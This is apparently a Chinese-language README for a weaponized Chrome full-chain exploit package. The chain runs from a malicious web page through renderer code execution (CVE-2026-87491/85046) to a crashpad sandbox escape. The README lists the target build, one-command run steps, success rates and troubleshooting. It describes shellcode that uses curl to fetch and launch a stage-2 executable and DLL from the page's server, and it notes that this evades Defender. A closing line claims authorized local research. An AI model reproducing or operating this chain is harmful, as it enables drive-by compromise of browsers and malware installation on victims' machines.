# Chrome 全链利用包 — 运行指南（v4 武器化）

网页 → 渲染进程 ACE → crashpad handler OS 沙箱逃逸（calc/notepad 弹出）。
**v4：零硬编码本地路径**——stage-2（poc.exe/evil.dll）由 payload 用系统 curl 从页面同源服务器自动拉取，无需在本机放任何 DLL。
技术细节见 `writeup.md`，速查见 `EXPLOIT.md`。

## 环境要求

| 项 | 要求 |
|---|---|
| OS | Windows 10 19045（x64，自带 `C:\Windows\System32\curl.exe`）|
| Chrome | Chrome for Testing **152.0.7977.54** x64，位于 `C:\pwn\chrome54\chrome-win64\chrome.exe` |
| 编译器 | MSYS2 clang64（clang 于 PATH；仅重建 payload/runner 时需要）|
| 目录 | 独立目录 `C:\pwn\chain-87491-85046-78952\`（chrome 日志/临时 profile 写在包内 tmp\）|

## 依赖清单

```
C:\pwn\chrome54\chrome-win64\chrome.exe   # 目标浏览器（驱动脚本启动用）
包内: runner.exe / run_chain.sh / run_w4.html / stage1w.js /
      payload_embed_w4.js / pocwin_full_w4.js / poc.exe / evil.dll
```

> 就这些。不再需要 `C:\pwn\launch64.dll`、`C:\pwn\evil.dll`、`XBOW-CRASHPAD-ESCAPE\poc\`——
> stage-2 全部由 curl 在运行期拉到 `%TEMP%`（curl 下载型进程创建经 Defender 实测放行）。

## 怎么跑（两条命令）

```bash
cd /c/pwn/chain-87491-85046-78952

# ① 编译本地 HTTP 服务（仅首次；缺 -lws2_32 会报 WSAStartup 链接错误）
clang -o runner.exe runner.c -lws2_32

# ② 一键跑链：自动循环，直到 calc/notepad 弹出即停
#    （runner 没跑会自动拉起——重启机器后也是这一条命令）
./run_chain.sh
```

**预期输出：**

```
round1 fail-fast              ← 概率阶段未中（正常）
round2 dep-miss               ← 已部署但竞态未中（正常）
=== FULL-CHAIN WIN round3 — calc/notepad 已弹出 ===
```

桌面弹出 **Calculator（计算器）和 Notepad（记事本）** = 完整 OS 沙箱逃逸达成
（双开花用于与手工打开的残留窗口区分；驱动脚本每轮开跑前会清场防误报）。

## 参数与成功率

```bash
./run_chain.sh 30        # 最多跑 30 轮（默认 60）
./rate_w4.sh 30          # 分阶段成功率统计
```

30 轮实测：**整链 43%/轮、到达部署 83%**，平均 ~48s/轮，期望 ~2.3 轮出 calc；
部署链（curl 拉取→落盘→启动）100% 可靠（宿主与浏览器双重验证，文件字节级一致）。

## 排障

| 症状 | 原因/解法 |
|---|---|
| 每轮都 `fail-fast` | stage1 概率低谷。确认 runner 存活：`curl http://127.0.0.1:8765/run_w4.html` 应返回 200 |
| `dep-miss` 连刷 | 概率性竞态未中，属正常；连 10+ 次才异常。看 `%TEMP%\ms64.exe/ev64.dll` 是否落盘（在=curl 链正常）|
| Chrome 起不来 | 残留僵尸：先 `taskkill /IM ms64.exe /F` 再 `taskkill /IM chrome.exe /F`（顺序反了会卡）|
| 重启机器后全 fail-fast | runner 没跑，`run_chain.sh` 会自动拉起；手动：`./runner.exe --nolaunch &`（端口写 port.txt）|
| 想看链路每步 | 打开任一 `cl_W4_*.log`，按 GCDBG→ST1→BOOT→ALIAS OK→PRE-DEPLOY→WROTE→VERIFY→ORIGIN-OK→DEPLOYED 顺序看 |
| 分析崩溃 dump | `./mdmp.exe tmp/tCH4N/Crashpad/reports/*.dmp`（异常地址/RIP/模块表；0xDEAD00xx=payload 信标）|

## 目录结构

```
├─ README.md                  # 本文件
├─ writeup.md                 # 深入 writeup（图文）
├─ EXPLOIT.md                 # 技术速查：链路/常量/30+坑/成功率
├─ run_chain.sh               # ★ 一键驱动（主链 run_w4.html）
├─ rate_w4.sh                 # 成功率统计
├─ run_w4.html                # ★ 入口页（v4）
├─ stage1w.js                 # CVE-2026-87491 + 85046 → cage RW
├─ pocwin_full_w4.js          # wasm 别名发现 + 部署 + origin 注入
├─ payload_src_w4.c           # 渲染器 shellcode 源码（curl 落地版，2.6KB）
├─ payload_embed_w4.js        # ↑ 编译产物（自动生成，含 ENTRY/ORIGIN_OFF）
├─ poc.exe / evil.dll         # stage-2（同源服务，curl 自动拉取）
├─ runner.c / runner.exe      # HTTP 服务
├─ mdmp.c / w4test.c          # dump 解析 / payload 宿主回归
├─ build_w3.sh                # payload 构建+embed 生成流水线参考
├─ 历史: run_poclaunch.html / pocwin_full.js / payload_src.c / launchdll.c / launch64.dll
├─ w2/w3 实验系: *w2*.c *w3*.c payload_src_w3*.c pocwin_full_w3.js 等（弃用方案存档）
└─ docs/                      # 证据截图
```

## 免责

授权隔离研究环境专用；所有目标为本地测试构建。
